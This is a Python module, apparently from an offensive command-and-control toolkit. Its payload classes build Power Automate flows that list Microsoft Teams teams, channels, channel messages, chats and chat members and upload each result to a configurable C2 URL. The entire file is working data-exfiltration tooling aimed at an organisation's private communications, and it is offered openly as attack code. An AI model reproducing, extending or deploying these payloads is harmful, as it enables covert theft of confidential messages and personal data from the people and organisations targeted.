from pypowerautomate.actions import *
from .base import BasePayload
from uuid import uuid4
from random import randint

class CollectTeamsChannelPayload(BasePayload):
    def __init__(self, client_id: str, c2_url: str, mode="http", task_id=None, **kwargs):
        self.suffix = hex(randint(1,2**20)).upper()[2:]
        self.client_id = client_id
        self.c2_url = c2_url
        self.mode = mode
        self.task_id = task_id
        self.upload = self.get_upload_method_generator(mode)
        self.download = self.get_download_method_generator(mode)

    def generate_payload(self) -> ScopeStatement:
        actions = Actions()
        # Get Teams List
        actions += GetAllTeamsAction(f"GetAllTeams-{self.suffix}")
        actions += self.upload(f"PostAllTeams-{self.suffix}", self.client_id, f"{self.c2_url}/teams/team_list", f"GetAllTeams-{self.suffix}")
        foreach = ForeachStatement(f"IterateTeams-{self.suffix}", f"@outputs('GetAllTeams-{self.suffix}')?['body/value']")
        loop_actions = Actions()
        loop_actions += GetChannelsForGroupAction(f"GetChannels-{self.suffix}", f"@items('IterateTeams-{self.suffix}')?['id']")
        loop_actions += self.upload(f"PostChannels-{self.suffix}", self.client_id, f"{self.c2_url}/teams/channel_list", f"GetChannels-{self.suffix}", self.task_id)
        foreach.set_actions(loop_actions)
        actions += foreach
        return ScopeStatement(f"CollectTeamsChannel_Scope-{self.suffix}", actions)


class CollectTeamsMessagePayload(BasePayload):
    def __init__(self, client_id: str, c2_url: str, teams_id: str, mode="http", task_id=None, **kwargs):
        self.suffix = hex(randint(1,2**20)).upper()[2:]
        self.client_id = client_id
        self.c2_url = c2_url
        self.teams_id = teams_id
        self.mode = mode
        self.task_id = task_id
        self.upload = self.get_upload_method_generator(mode)
        self.download = self.get_download_method_generator(mode)

    def generate_payload(self) -> ScopeStatement:
        actions = Actions()
        actions += GetChannelsForGroupAction(f"ListTeamsChannels-{self.suffix}", self.teams_id)

        foreach = ForeachStatement(f"IterateChannels-{self.suffix}", f"@outputs('ListTeamsChannels-{self.suffix}')?['body/value']")
        loop_actions = Actions()
        loop_actions += GetMessagesFromChannelAction(f"GetMessages-{self.suffix}", self.teams_id, f"@items('IterateChannels-{self.suffix}')?['id']")
        loop_actions += self.upload(f"PostMessages-{self.suffix}", self.client_id, f"{self.c2_url}/teams/messages", f"GetMessages-{self.suffix}", self.task_id)
        foreach.set_actions(loop_actions)
        actions += foreach
        return ScopeStatement(f"CollectChannelMessages_Scope-{self.suffix}", actions)


class CollectTeamsChatsPayload(BasePayload):
    def __init__(self, client_id: str, c2_url: str, mode="http", task_id=None, **kwargs):
        self.suffix = hex(randint(1,2**20)).upper()[2:]
        self.client_id = client_id
        self.c2_url = c2_url
        self.mode = mode
        self.task_id = task_id
        self.upload = self.get_upload_method_generator(mode)
        self.download = self.get_download_method_generator(mode)

    def generate_payload(self) -> ScopeStatement:
        actions = Actions()
        # Get Teams List
        actions += GetChatsAction(f"GetChats-{self.suffix}")
        actions += self.upload(f"PostChatList-{self.suffix}", self.client_id, f"{self.c2_url}/teams/chat_list", f"GetChats-{self.suffix}", self.task_id)
        return ScopeStatement(f"CollectTeamsChat_Scope-{self.suffix}", actions)


class CollectTeamsChatMemberPayload(BasePayload):
    def __init__(self, client_id: str, c2_url: str, chat_id: str, mode="http", task_id=None, **kwargs):
        self.suffix = hex(randint(1,2**20)).upper()[2:]
        self.client_id = client_id
        self.c2_url = c2_url
        self.mode = mode
        self.task_id = task_id
        self.chat_id = chat_id
        self.upload = self.get_upload_method_generator(mode)
        self.download = self.get_download_method_generator(mode)

    def generate_payload(self) -> ScopeStatement:
        actions = Actions()
        # Get Teams List
        name = str(uuid4())
        actions += ListMembersAction(name, self.chat_id)
        actions += self.upload(f"PostChatList-{self.suffix}", self.client_id, f"{self.c2_url}/teams/chat_members", name, self.task_id)
        return ScopeStatement(f"{name}_Scope-{self.suffix}", actions)
